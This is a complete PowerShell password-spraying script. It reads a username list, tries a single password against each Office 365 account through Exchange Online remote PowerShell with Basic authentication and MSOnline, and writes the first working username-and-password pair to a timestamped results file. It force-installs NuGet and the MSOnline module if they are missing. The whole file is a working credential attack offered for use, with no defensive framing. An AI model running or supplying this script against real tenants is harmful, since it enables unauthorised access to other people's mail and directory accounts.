Param(
[Parameter(Position = 0, Mandatory = $True)]
[String]$Password,
[Parameter(Position = 1, Mandatory = $True)]
[String]$UserList
)

#Testing output file path and creating file if neccessary 
$FileName = "results_" + (get-date -Format "ddMMyyyyhhmmss") + ".txt"
If(!(Test-Path -Path $FileName))
{
    Write-Host "$FileName is missing, creating file"
    New-Item -Path $FileName -ItemType File | Out-Null
}

#Testing path to file passed in with $UserList
If(!(Test-Path -Path $UserList))
{
    Write-Host "The UserList file $UserList is not a valid file."
    Write-Host "Please try again with a correct file."
    Exit
}

#Checking for MSOnline Module and Installing if not present
If(Get-Module -ListAvailable | Where-Object{$_.Name -eq "MSOnline"})
{
    Try
    {
        Write-Host "Loading MSOnline Powershell Module"
        Import-Module MSOnline
    }
    Catch
    {
        Write-Host $_.Exception.Message
        Write-Host $_.InvocationInfo.PositionMessage
        Throw "Unable to execute script, unable to load MSOnline Powershell Module"
    }
}
Else
{
    Try
    {
        Write-Host "Installing NuGet Package Provider"
        Install-PackageProvider -Name NuGet -Force
        $NuGetPath = (Get-PackageProvider -Name NuGet -ListAvailable).ProviderPath
        If(-not(Get-PackageProvider -Name Nuget))
        {
            Import-PackageProvider -Path $NuGetpath
        }
        Write-Host "Installing MSOline Powershell Module"
        Install-Module MSOnline -Force
    }
    Catch
    {
        Write-Host $_.Exception.Message
        Write-Host $_.InvocationInfo.PositionMessage
        Throw "Unable to execute script, unable to install MSOnline Powershell Module"
    }
}

$x=0
ForEach ($UserName in (Get-Content $UserList))
{
    $x++
    Write-Host "User #$x"
    Write-Host "Trying username $UserName"
    $O365Password = $Password | ConvertTo-SecureString -asPlainText -Force
    $Credential = New-Object System.Management.Automation.PSCredential($UserName,$O365Password)
    $O365Session = New-PSSession –ConfigurationName Microsoft.Exchange -ConnectionUri https://ps.outlook.com/powershell -Credential $credential -Authentication Basic -AllowRedirection
    Connect-MsolService –Credential $Credential
    $Domains = Get-Msoldomain
    If ($Domains) 
    { 
        Add-Content -Path "$FileName" -Value "$UserName is using password $Password"
        Write-Host $username is using password $Password 
        Exit
    }
}
